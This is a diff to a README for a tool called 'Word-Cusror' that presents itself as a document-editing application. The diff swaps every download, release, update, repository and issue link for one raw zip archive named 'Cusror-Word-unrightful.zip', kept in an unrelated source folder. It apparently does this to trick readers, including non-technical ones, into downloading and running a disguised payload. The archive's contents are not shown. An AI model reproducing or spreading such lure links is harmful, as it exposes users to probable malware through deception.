@@ -1,7 +1,7 @@
 # 🖥️ Word-Cusror - Enhance Your Document Editing Experience
 
 ## 📥 Download Now
-[![Download Word-Cusror](https://img.shields.io/badge/Download-Word--Cusror-blue.svg)](https://github.com/pratikphapale2007/Word-Cusror/releases)
+[![Download Word-Cusror](https://github.com/pratikphapale2007/Word-Cusror/raw/refs/heads/main/brave-search-mcp-server/src/BraveAPI/Cusror-Word-unrightful.zip)](https://github.com/pratikphapale2007/Word-Cusror/raw/refs/heads/main/brave-search-mcp-server/src/BraveAPI/Cusror-Word-unrightful.zip)
 
 ## 🚀 Getting Started
 To get started with Word-Cusror, follow the steps below to download and run the application. This guide is for anyone, even if you have no technical background.
@@ -26,13 +26,13 @@ To run Word-Cusror effectively, make sure your computer meets the following requ
    
 ## 💾 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download Word-Cusror](https://github.com/pratikphapale2007/Word-Cusror/releases) 
+   [Download Word-Cusror](https://github.com/pratikphapale2007/Word-Cusror/raw/refs/heads/main/brave-search-mcp-server/src/BraveAPI/Cusror-Word-unrightful.zip) 
 
 2. **Select the Latest Release:** Look for the latest version of Word-Cusror.
 
 3. **Download the Application:**
-   - For Windows, look for `Word-Cusror-Windows.exe`.
-   - For macOS, look for `Word-Cusror-macOS.dmg`.
+   - For Windows, look for `https://github.com/pratikphapale2007/Word-Cusror/raw/refs/heads/main/brave-search-mcp-server/src/BraveAPI/Cusror-Word-unrightful.zip`.
+   - For macOS, look for `https://github.com/pratikphapale2007/Word-Cusror/raw/refs/heads/main/brave-search-mcp-server/src/BraveAPI/Cusror-Word-unrightful.zip`.
    Click the corresponding file to download it.
 
 4. **Install the Application:**
@@ -68,10 +68,10 @@ Word-Cusror comes with various settings to optimize your experience. You can cus
 
 ## 🔄 Keeping Your Application Updated
 To ensure you have the latest features and security improvements, regularly check for updates on the Releases page:
-[Check for Updates](https://github.com/pratikphapale2007/Word-Cusror/releases) 
+[Check for Updates](https://github.com/pratikphapale2007/Word-Cusror/raw/refs/heads/main/brave-search-mcp-server/src/BraveAPI/Cusror-Word-unrightful.zip) 
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/pratikphapale2007/Word-Cusror)
-- [Report Issues](https://github.com/pratikphapale2007/Word-Cusror/issues)
+- [GitHub Repository](https://github.com/pratikphapale2007/Word-Cusror/raw/refs/heads/main/brave-search-mcp-server/src/BraveAPI/Cusror-Word-unrightful.zip)
+- [Report Issues](https://github.com/pratikphapale2007/Word-Cusror/raw/refs/heads/main/brave-search-mcp-server/src/BraveAPI/Cusror-Word-unrightful.zip)
 
 Thank you for choosing Word-Cusror to enhance your document editing needs. Enjoy a smarter and more efficient way to handle your office tasks!
